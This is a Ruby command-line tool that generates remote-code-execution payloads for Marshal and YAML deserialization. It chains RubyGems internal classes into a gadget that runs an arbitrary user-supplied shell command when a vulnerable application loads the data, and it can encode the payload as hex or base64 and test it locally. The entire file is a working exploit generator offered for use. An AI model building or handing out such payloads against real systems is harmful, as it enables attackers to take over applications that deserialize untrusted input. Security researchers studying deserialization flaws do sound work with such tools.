#!/usr/bin/env ruby
require 'optparse'
require 'yaml'

Options = Struct.new(:save,:encode,:yaml,:command,:test)

class Parser
  def self.parse(options)
    args = Options.new("Ruby RCE deserialization payload generator")

    opt_parser = OptionParser.new do |opts|
      opts.banner = "Usage: serializer.rb [options]"

      opts.on("-sFILE", "--save=FILE", "File to store payload (default=payload)") do |f|
        args.save = f
      end
      opts.on("-y", "--yaml", "Generate YAML payload (default is False)") do |y|
        args.yaml = y
      end
	  opts.on("-t", "--test", "Attempt payload deserialization") do |t|
        args.test = t
      end
	  opts.on("-cCOMMAND", "--command=COMMAND", "Command to execute") do |c|
        args.command = c
      end
	  opts.on("-eENCODE", "--encode=ENCODE", "Encode payload (base64|hex)") do |e|
        args.encode = e
      end
      opts.on("-h", "--help", "Prints this help") do
        puts opts
        exit
      end
    end

    opt_parser.parse!(options)
    return args
  end
end

class Tester
	def self.test(type, payload, payload_file)
		puts "[*] Deserializing payload "+ type +" in place"
		if type == "yaml" then
			YAML.load(File.read(payload_file)) rescue (puts "[+] Payload Executed Successfully")
		else
			Marshal.load(payload) rescue nil
		end
		puts "[*] Deserializing payload " + type + " in new process"
		if type == "yaml" then
			cmd_string = "require 'yaml';YAML.load(File.read('"+payload_file+"'))"
			puts cmd_string
			puts IO.popen(["ruby","-e", cmd_string]).read
		else
			cmd_string = "'Marshal.load(STDIN.read) rescue nil'"
			IO.popen(cmd_string, "r+") do |pipe|
				pipe.print payload
				pipe.close_write
				puts pipe.gets
				puts
			end
		end
	end
end

args = Parser.parse ARGV

if not args[:command] then
	abort("[-] Command required")
else
	command_length = args.command.length
	command = "|"+args.command+" 1>&2"
end

class Gem::StubSpecification
	def initialize; end
end

command_tag = "|echo " + "A" * (command_length-5) + " 1>&2"
stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, command_tag)

puts "[+] Building payload"
stub_specification.name rescue nil

class Gem::Source::SpecificFile
	def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

specific_file <=> other_specific_file rescue nil

$dependency_list = Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

$dependency_list.each{} rescue nil
dependency_list = $dependency_list

class Gem::Requirement
	def marshal_dump
		[$dependency_list]
	end
end

payload = Marshal.dump(Gem::Requirement.new)

type = (args.yaml ? "yaml" : "marshal")
if type == "yaml" then
	ext = ".yml"
	gem = Gem::Requirement.new
	gem.instance_variable_set(:@requirements, [dependency_list])
	payload = YAML.dump(gem)
else
	ext = ".raw"
	payload = Marshal.dump(Gem::Requirement.new)
end

payload = payload.gsub(command_tag,command)


if args[:save]
	payload_file = args[:save] + ext
	File.open(payload_file, 'w') { |file| file.write(payload) }
end

if args[:test] then
	puts "[+] Deserializing payload"
	Tester.test(type, payload, payload_file)
end

print args.encode
encode = ( args[:encode] ? args[:encode] : "") 

if encode == "hex" then
	puts "Payload (hex):"
	puts payload.unpack('H*')[0]
	puts
elsif encode == "base64"
	require 'base64'
	puts "Payload (base64):"
	puts Base64.encode64(payload)
	puts
else
	puts "Payload (raw):"
	puts payload
	puts
end